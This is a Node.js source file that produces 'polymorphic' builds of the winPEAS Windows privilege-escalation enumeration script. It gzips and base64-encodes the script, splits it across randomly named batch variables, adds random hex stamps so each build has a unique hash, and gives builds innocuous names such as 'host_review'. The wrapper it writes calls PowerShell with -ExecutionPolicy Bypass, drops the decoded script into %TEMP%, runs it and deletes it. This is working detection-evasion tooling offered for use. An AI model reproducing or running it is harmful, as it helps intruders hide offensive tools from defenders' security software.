/**
 * Polymorphic WinPEAS batch builder — unique wrapper + stamp each generation.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const {
  randomId,
  readManifest,
  writeManifest,
  BUILDS_DIR,
} = require('./polymorph');

const ROOT = path.join(__dirname, '..');
const WINPEAS_SRC = path.join(ROOT, 'winPEAS.bat');

const WIN_ENUM_NAMES = [
  'win_audit',
  'host_review',
  'local_enum',
  'priv_check',
  'workstation_scan',
];

function randomIdent(prefix) {
  const n = crypto.randomBytes(4).toString('hex');
  return `${prefix}${n}`;
}

function chunkString(s, minLen, maxLen) {
  const parts = [];
  let i = 0;
  while (i < s.length) {
    const len = minLen + (crypto.randomBytes(1)[0] % (maxLen - minLen + 1));
    parts.push(s.slice(i, i + len));
    i += len;
  }
  return parts;
}

function buildBatWrapper(gzB64, stamp) {
  const chunks = chunkString(gzB64, 40, 88);
  const partVars = chunks.map(() => randomIdent('w'));

  const setLines = partVars.map((v, i) => `set "${v}=${chunks[i]}"`).join('\r\n');
  const dataBuild = partVars.map((v) => `!${v}!`).join('');

  return `@echo off\r
setlocal EnableDelayedExpansion\r
REM poly:${stamp}\r
REM ${crypto.randomBytes(20).toString('hex')}\r
${setLines}\r
set "_WP_DATA=${dataBuild}"\r
set "_WP_OUT=%TEMP%\\wp_${stamp.slice(0, 8)}_%RANDOM%.bat"\r
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $b=[Convert]::FromBase64String($env:_WP_DATA); $ms=New-Object System.IO.MemoryStream(,$b); $gz=New-Object System.IO.Compression.GzipStream($ms,[System.IO.Compression.CompressionMode]::Decompress); $sr=New-Object System.IO.StreamReader($gz); $t=$sr.ReadToEnd(); $sr.Close(); $gz.Close(); $ms.Close(); [IO.File]::WriteAllText($env:_WP_OUT,$t,[Text.UTF8Encoding]::new($false)); }"\r
if not exist "%_WP_OUT%" exit /b 1\r
call "%_WP_OUT%" %*\r
set "_WP_EC=!ERRORLEVEL!"\r
del /f /q "%_WP_OUT%" >nul 2>&1\r
exit /b !_WP_EC!\r
`;
}

function mutateWinpeasSource(text, stamp) {
  const inject = `REM poly_build:${stamp}\r\nREM ${crypto.randomBytes(12).toString('hex')}\r\n`;
  if (/^@echo off/i.test(text)) {
    return text.replace(/^@echo off[^\r\n]*\r?\n/i, (m) => m + inject);
  }
  return inject + text;
}

function defaultWinpeasName() {
  const base = WIN_ENUM_NAMES[crypto.randomBytes(1)[0] % WIN_ENUM_NAMES.length];
  return `${base}_${crypto.randomBytes(3).toString('hex')}`;
}

async function generateWinpeasBuild(options = {}) {
  if (!fs.existsSync(WINPEAS_SRC)) {
    throw new Error('winPEAS.bat not found in project root');
  }

  const id = randomId();
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');

  let raw = fs.readFileSync(WINPEAS_SRC, 'utf8');
  if (raw.charCodeAt(0) === 0xfeff) raw = raw.slice(1);
  raw = raw.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  const mutated = mutateWinpeasSource(raw.replace(/\n/g, '\r\n'), stamp);
  const gz = zlib.gzipSync(Buffer.from(mutated, 'utf8'), { level: 9 });
  const gzB64 = gz.toString('base64');

  let wrapper = buildBatWrapper(gzB64, stamp);
  wrapper += `REM tail:${crypto.randomBytes(64 + (crypto.randomBytes(1)[0] % 256)).toString('hex')}\r\n`;

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const baseName = (options.outputName || defaultWinpeasName()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = /\.bat$/i.test(baseName) ? baseName : `${baseName}.bat`;
  const outPath = path.join(workDir, outName);

  fs.writeFileSync(outPath, wrapper, 'utf8');

  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);

  const meta = {
    id,
    platform: 'windows',
    arch: String(options.arch || 'amd64'),
    variant: 'winpeas',
    tool: 'winpeas-bat',
    format: 'bat',
    fileName: outName,
    size: stat.size,
    sha256,
    stamp: stamp.slice(0, 16),
    buildid,
    sourceBytes: Buffer.byteLength(mutated, 'utf8'),
    gzipBytes: gz.length,
    injectDllPacked: false,
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = { generateWinpeasBuild };
